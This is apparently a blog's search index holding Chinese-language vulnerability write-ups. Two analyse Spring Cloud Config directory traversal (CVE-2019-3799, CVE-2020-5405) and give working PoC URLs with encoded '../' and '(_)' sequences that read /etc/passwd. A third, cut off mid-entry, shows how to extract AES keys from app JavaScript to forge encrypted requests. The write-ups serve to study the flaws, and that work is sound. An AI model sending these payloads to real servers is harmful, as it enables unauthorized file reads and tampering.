<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2019-3799 Spring Cloud Config目录遍历漏洞</title>
    <url>/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/</url>
    <content><![CDATA[<p>官方描述：<a href="https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released" target="_blank" rel="noopener">https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released</a></p>
<blockquote>
<p>We have released Spring Cloud Config 2.1.2, 2.0.4, and 1.4.6 to address <a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">CVE-2019-3799: Directory Traversal with spring-cloud-config-server</a>. Please review the information in the CVE report and upgrade immediately.</p>
</blockquote>
<p>在<a href="https://github.com/spring-cloud/spring-cloud-config/releases" target="_blank" rel="noopener">release</a>中找到修复前的版本2.1.1代码 <a href="https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE</a> 用于复现</p>
<a id="more"></a>

<p>本次更新的代码路径为<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/GenericResourceRepository.java</code>，commit地址为 <a href="https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2</a></p>
<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p>补丁主要是在findOne()方法中增加了传入参数path的判断</p>
<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/diff-2.1.1-findOne.png" alt="diff-2.1.1-findOne.png"></p>
<p><code>isInvalidPath</code>方法用于判断路径中是否存在<code>WEB-INF</code>、<code>META-INF</code>、<code>:/</code>、<code>../</code>，如果存在则返回true，导致<code>if (!isInvalidPath(local))</code>为假。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isInvalidPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"WEB-INF"</span>) || path.contains(<span class="string">"META-INF"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path with \"WEB-INF\" or \"META-INF\": ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">":/"</span>)) &#123;</span><br><span class="line">        String relativePath = (path.charAt(<span class="number">0</span>) == <span class="string">'/'</span> ? path.substring(<span class="number">1</span>) : path);</span><br><span class="line">        <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">"url:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(<span class="string">"Path represents URL or has \"url:\" prefix: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">".."</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">"../"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path contains \"../\" after call to StringUtils#cleanPath: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>isInvalidEncodedPath</code>方法用于判断路径中是否存在<code>%</code>，若存在则再进行一次URL解码再调用<code>isInvalidPath</code>方法。</p>
<p>第二个和第三个if中的<code>processPath</code>方法是将<code>\</code>替换成<code>/</code>，再清除连续重复的<code>/</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isInvalidEncodedPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"%"</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Use URLDecoder (vs UriUtils) to preserve potentially decoded UTF-8 chars</span></span><br><span class="line">            String decodedPath = URLDecoder.decode(path, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            decodedPath = processPath(decodedPath);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalArgumentException | UnsupportedEncodingException ex) &#123;</span><br><span class="line">            <span class="comment">// Should never happen...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
<p>调试所使用版本为<code>spring-cloud-config-2.1.1.RELEASE</code></p>
</blockquote>
<p>既然是findOne()方法中增加了路径分析，表明之前未做路径防护可能导致任意文件读取漏洞产生。回溯findOne()方法就能找到漏洞的利用点。查看findOne()方法的调用信息（在方法处右键点击Find Usages），可以看到有12处相关引用，由于限制在path参数，于是主要寻找path参数可控的点。</p>
<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/find-findOne-usages.png" alt="find-findOne-usages.png"></p>
<p>找到<code>src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java</code>中调用了<code>findOne()</code>方法，且path可控。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">retrieve</span><span class="params">(@PathVariable String name, @PathVariable String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        @PathVariable String label, ServletWebRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">        @RequestParam(defaultValue = <span class="string">"true"</span>)</span> <span class="keyword">boolean</span> resolvePlaceholders)</span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String path = getFilePath(request, name, profile, label);</span><br><span class="line">    <span class="keyword">return</span> retrieve(request, name, profile, label, path, resolvePlaceholders);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> String <span class="title">retrieve</span><span class="params">(ServletWebRequest request, String name, String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        String label, String path, <span class="keyword">boolean</span> resolvePlaceholders)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    name = resolveName(name);</span><br><span class="line">    label = resolveLabel(label);</span><br><span class="line">    Resource resource = <span class="keyword">this</span>.resourceRepository.findOne(name, profile, label, path);</span><br><span class="line">    <span class="keyword">if</span> (checkNotModified(request, resource)) &#123;</span><br><span class="line">        <span class="comment">// Content was not modified. Just return.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ensure InputStream will be closed to prevent file locks on Windows</span></span><br><span class="line">    <span class="keyword">try</span> (InputStream is = resource.getInputStream()) &#123;</span><br><span class="line">        String text = StreamUtils.copyToString(is, Charset.forName(<span class="string">"UTF-8"</span>));</span><br><span class="line">        <span class="keyword">if</span> (resolvePlaceholders) &#123;</span><br><span class="line">            Environment environment = <span class="keyword">this</span>.environmentRepository.findOne(name,</span><br><span class="line">                    profile, label);</span><br><span class="line">            text = resolvePlaceholders(prepareEnvironment(environment), text);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>path参数为<code>@RequestMapping(&quot;/{name}/{profile}/{label}/**&quot;)</code>中<code>**</code>的部分，也就是uri第三个标签后的全部内容。注意此处传入的label必须为master，具体原因在CVE-2020-5405中会讲到。</p>
<p>传入<code>GET /name/profile/master/..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code>时，path参数为<code>..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code></p>
<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-retrieve.png" alt="debug-retrieve"></p>
<p><code>FileUrlResource</code>对象中的<code>relativePath</code>为<code>..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Ftest.txt</code></p>
<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-FileUrlResource.png" alt="debug-FileUrlResource"></p>
<p>path解码后的路径，路径回溯正好变成<code>/tmp/test.txt</code></p>
<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-file.png" alt="debug-file"></p>
<p>findOne()方法执行完成之后，返回Resource对象。Resource是Spring框架中用于访问低级资源的一个抽象接口，常用来读取配置文件。</p>
<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-return-file.png" alt="debug-return-file" style="zoom:43%;">

<p>根据findOne()返回的Resource对象，读取到的文件内容。</p>
<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-get-text.png" alt="debug-get-text" style="zoom:40%;">



<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>IDEA导入程序后，先等待maven自动安装依赖。依赖安装完成后，找到spring-cloud-config-server中<code>src/main/java/org/springframework/cloud/config/server/ConfigServerApplication.java</code>，点击<code>ConfigServerApplication</code>类右边的运行，启动程序即可，端口默认为8888，想要修改端口的话可在<code>src/main/resources/configserver.yml</code>中修改。</p>
<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/run-application.png" alt="run-application.png" style="zoom:40%;">



<p>程序运行起来之后访问<code>http(s)://ip:port/foo/label/master/..%252f..%252f..%252f..%252fetc%252fpasswd</code>得到以下结果</p>
<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/poc-request.png" alt="poc-request"></p>
<p>不二次编码的效果如下，因为不二次编码传到代码前会自动URL解码一次，变成<code>/foo/label/master/../../../../etc/passwd</code>，等效于直接访问<code>/../etc/passwd</code>，tomcat会把它识别成一个错误的URI，请求不会传到ResourceController中，也就不会进行后续<code>findOne()</code>方法的调用。</p>
<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/not-double-encode.png" alt="not-double-encode"></p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-5405 Spring Cloud Config目录遍历漏洞绕过</title>
    <url>/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/</url>
    <content><![CDATA[<p>该漏洞是CVE-2019-3799的绕过。</p>
<p>存在漏洞的版本：2.2.x系列：&lt; 2.2.2，2.1.x系列：&lt; 2.1.7</p>
<a id="more"></a>

<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p>将2.1.6和2.1.7版本进行<a href="https://github.com/spring-cloud/spring-cloud-config/compare/v2.1.6.RELEASE...v2.1.7.RELEASE?diff=split" target="_blank" rel="noopener">对比</a>，其中增加了对所有location是否合法的判断。在上一个漏洞（CVE-2019-3799）中仅对<code>path</code>进行了判断。2.1.6版本（左侧）代码第69行将<code>path</code>参数传递给了<code>local</code>变量，两者的值是一样的，在第70行if判断中<code>!isInvalidPath(local) &amp;&amp; !isInvalidEncodedPath(local)</code>中的参数<code>local</code>也就是<code>path</code>。</p>
<p><img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/diff-2.1.6.png" alt="diff-2.1.6"></p>
<p><code>isInvalidEncodedLocation</code>和<code>isInvalidEncodedPath</code>一样，都是用于判断路径中是否存在<code>%</code>，若存在则再进行一次URL解码再调用<code>isInvalidPath</code>方法，不同的是，<code>isInvalidEncodedLocation</code>调用的是<code>isInvalidLocation</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isInvalidEncodedLocation</span><span class="params">(String location)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (location.contains(<span class="string">"%"</span>)) &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">// Use URLDecoder (vs UriUtils) to preserve potentially decoded UTF-8</span></span><br><span class="line">			<span class="comment">// chars</span></span><br><span class="line">			String decodedPath = URLDecoder.decode(location, <span class="string">"UTF-8"</span>);</span><br><span class="line">			<span class="keyword">if</span> (isInvalidLocation(decodedPath)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			decodedPath = processPath(decodedPath);</span><br><span class="line">			<span class="keyword">if</span> (isInvalidLocation(decodedPath)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (IllegalArgumentException | UnsupportedEncodingException ex) &#123;</span><br><span class="line">			<span class="comment">// Should never happen...</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> isInvalidLocation(location);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>isInvalidLocation</code>方法比<code>isInvalidPath</code>简单一些，仅对<code>..</code>进行判断。<code>isInvalidPath</code>方法则判断<code>WEB-INF</code>、<code>META-INF</code>、<code>:/</code>、<code>../</code>多个的字符。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isInvalidLocation</span><span class="params">(String location)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">boolean</span> isInvalid = location.contains(<span class="string">".."</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (isInvalid &amp;&amp; logger.isWarnEnabled()) &#123;</span><br><span class="line">		logger.warn(<span class="string">"Location contains \"..\""</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> isInvalid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
<p>调试所使用版本为<code>spring-cloud-config-2.1.6.RELEASE</code></p>
</blockquote>
<p>漏洞利用需要用到<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java</code>中字符替换的操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> String <span class="title">retrieve</span><span class="params">(ServletWebRequest request, String name, String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">		String label, String path, <span class="keyword">boolean</span> resolvePlaceholders)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">	name = resolveName(name);</span><br><span class="line">	label = resolveLabel(label);</span><br><span class="line">	Resource resource = <span class="keyword">this</span>.resourceRepository.findOne(name, profile, label, path);</span><br><span class="line">	<span class="keyword">if</span> (checkNotModified(request, resource)) &#123;</span><br><span class="line">		<span class="comment">// Content was not modified. Just return.</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ensure InputStream will be closed to prevent file locks on Windows</span></span><br><span class="line">	<span class="keyword">try</span> (InputStream is = resource.getInputStream()) &#123;</span><br><span class="line">		String text = StreamUtils.copyToString(is, Charset.forName(<span class="string">"UTF-8"</span>));</span><br><span class="line">		<span class="keyword">if</span> (resolvePlaceholders) &#123;</span><br><span class="line">			Environment environment = <span class="keyword">this</span>.environmentRepository.findOne(name,</span><br><span class="line">					profile, label);</span><br><span class="line">			text = resolvePlaceholders(prepareEnvironment(environment), text);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> text;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关注最开始的两行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">label = resolveLabel(label);</span><br><span class="line">name = resolveName(name);</span><br></pre></td></tr></table></figure>

<p>其中<code>resolveLabel</code>和<code>resolveName</code>方法如下，将<code>(_)</code>替换成<code>/</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">resolveName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (name != <span class="keyword">null</span> &amp;&amp; name.contains(<span class="string">"(_)"</span>)) &#123;</span><br><span class="line">		<span class="comment">// "(_)" is uncommon in a git repo name, but "/" cannot be matched</span></span><br><span class="line">		<span class="comment">// by Spring MVC</span></span><br><span class="line">		name = name.replace(<span class="string">"(_)"</span>, <span class="string">"/"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">resolveLabel</span><span class="params">(String label)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (label != <span class="keyword">null</span> &amp;&amp; label.contains(<span class="string">"(_)"</span>)) &#123;</span><br><span class="line">		<span class="comment">// "(_)" is uncommon in a git branch name, but "/" cannot be matched</span></span><br><span class="line">		<span class="comment">// by Spring MVC</span></span><br><span class="line">		label = label.replace(<span class="string">"(_)"</span>, <span class="string">"/"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> label;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以可以利用<code>(_)</code>来代替<code>/</code>作为路径分隔符使得<code>@RequestMapping(&quot;/{name}/{profile}/{label}/**&quot;)</code>中<code>{name}</code>和<code>{lable}</code>就能携带路径分隔符和路径回溯符进行任意文件读取。</p>
<p>如果没有这个替换，在路由分配时就没办法在<code>{name}</code>和<code>{lable}</code>中进行回溯，举个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;abc&#x2F;xyz&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd  &#x3D;&gt; </span><br><span class="line">name&#x3D;abc   profile&#x3D;xyz   label&#x3D;..   path&#x3D;..&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">&#x2F;abc&#x2F;xyz&#x2F;..(_)..&#x2F;etc&#x2F;passwd &#x3D;&gt; </span><br><span class="line">name&#x3D;abc   profile&#x3D;xyz   label&#x3D;..(_)..   path&#x3D;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>



<p>尝试构造请求<code>http://127.0.0.1:8889/test/test/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29tmp/test.txt</code>，报500错误</p>
<p><img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/500-error.png" alt="500-error"></p>
<p>查看报错信息，提示<code>Branch name ../../../../../../../tmp is not allowed</code></p>
<p><img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/error-message.png" alt="error-message"></p>
<p>在checkout处会进行git请求，造成报错</p>
<p><code>src/main/java/org/springframework/cloud/config/server/environment/JGitEnvironmentRepository.java</code></p>
<img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/debug-checkout.png" alt="debug-checkout" style="zoom:45%;">



<p>因为在默认配置下，spring cloud config使用git远程读取配置，label表示git的分支，在CVE-2019-3799中label的值为master，master分支存在才能进一步读取文件。若修改想要label的值并成功读取任意文件，需要将配置改成本地才不会进行git checkout。</p>
<img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/edit-config.png" alt="edit-config" style="zoom:50%;">



<p>修改配置成以下配置，即改为读取本地配置，从而能读取本地文件。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">component:</span> <span class="string">Config</span> <span class="string">Server</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">configserver</span></span><br><span class="line">  <span class="attr">autoconfigure.exclude:</span> <span class="string">org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration</span></span><br><span class="line">  <span class="attr">jmx:</span></span><br><span class="line">    <span class="attr">default_domain:</span> <span class="string">cloud.config.server</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">native:</span></span><br><span class="line">          <span class="attr">search-locations:</span> <span class="string">file:///Users/seikei/spring-cloud-config-2.1.6.RELEASE/spring-cloud-config-server/src/test/resources/test</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">native</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8889</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">context_path:</span> <span class="string">/admin</span></span><br></pre></td></tr></table></figure>



<p>再次调试，此时locations[1]的值为<code>file:///Users/seikei/Records/Java/spring-cloud-config-2.1.6.RELEASE/spring-cloud-config-server/src/test/resources/test../../../../../../../../../../../tmp/</code>，路径回溯之后正好就是<code>file:/tmp/test.txt</code></p>
<img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/debug-return-file.png" alt="debug-return-file" style="zoom:45%;">



<p>⚠️：若<code>search-locations</code>使用的是相对路径，比如<code>search-locations: file:./src/test/resources/test</code>，则需要在路径前添加<code>%252f</code>，因为相对路径拼接label再回溯之后会变成<code>file:tmp/test/txt</code>导致无法读取文件。（当然绝对路径多添加一个<code>%252f</code>也能正常访问，在测试时多添加一个<code>%252f</code>能提升PoC的成功率）</p>
<img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/debug-relative-path.png" alt="debug-relative-path" style="zoom:45%;">



<p>加上<code>%252f</code>之后就变成了<code>file:%2ftmp/test.txt</code>，在file协议读取文件时会再次URL解码变成<code>file:/tmp/test.txt</code>成功读取文件</p>
<img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/debug-add-slash.png" alt="debug-add-slash" style="zoom:45%;">





<p>注：v2.2.0.RELEASE以上无法读取无后缀的文件，在ResourceController中添加了一行获取后缀的代码，若传入无后缀的文件会产生500报错。</p>
<p><a href="https://github.com/spring-cloud/spring-cloud-config/blob/v2.2.0.RELEASE/spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java#L148" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/blob/v2.2.0.RELEASE/spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java#L148</a></p>
<img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/notice-ext.png" alt="notice-ext" style="zoom:45%;">



<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>通用的PoC，绝对路径和相对路径都能使用：<a href="http://127.0.0.1:8889/test/test/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%252ftmp/test.txt" target="_blank" rel="noopener">http://127.0.0.1:8889/test/test/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%252ftmp/test.txt</a></p>
<p><img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/poc-request.png" alt="poc-request"></p>
]]></content>
  </entry>
  <entry>
    <title>通过JS解开加密传输</title>
    <url>/2020/04/03/JS-Decrypt/</url>
    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
</blockquote>
<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
<a id="more"></a>

<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
<p>偏移量iv：<code>0108489312380708</code></p>
<p>AES加解密的过程如下图，还是比较清晰的。</p>
<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
<p>下图是调试过程，密钥就直接拿到了：</p>
<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
<p>通过调试可以知道，D是：（去除了\）</p>
